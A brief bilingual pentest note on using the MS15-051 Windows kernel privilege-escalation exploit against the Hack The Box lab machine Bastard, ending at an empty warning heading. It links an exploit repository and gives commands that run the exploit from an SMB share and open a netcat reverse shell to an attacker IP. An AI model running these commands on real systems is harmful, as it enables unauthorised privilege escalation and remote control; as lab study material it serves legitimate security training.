
## DESCRIPTION

This security update resolves vulnerabilities in Microsoft Windows. The more severe of these vulnerabilities could allow elevation of privilege if an attacker logs on locally and runs arbitrary code in kernel mode. An attacker could then install programs; view, change, or delete data; or create new accounts with full user rights. An attacker must have valid logon credentials and be able to log on locally to exploit this vulnerability. The vulnerability cannot be exploited remotely or by anonymous users.

Vulnerable and checked versión: Windows Server 2008, x64 architecture.

#### Mas información:
* https://learn.microsoft.com/en-us/security-updates/securitybulletins/2015/ms15-051
* https://0xdf.gitlab.io/2019/03/12/htb-bastard.html


## EXPLOITATION

1. Descargamos el exploit: https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-051

2. Lo tranferimos a la máquina: [[TRANSFERRING FILES]]

3. Ejecutamos:

```
#Using smb resource
\\10.10.14.14\share\ms15-051x64.exe "whoami"
#Using nc to create a reverse shell
\\10.10.14.14\share\ms15-051x64.exe "\\10.10.14.14\share\nc64.exe -e cmd.exe 10.10.14.14 443"
```

## MACHINES

* Hack The Box: Bastard

**!!NOTA IMPORTANTE!!** 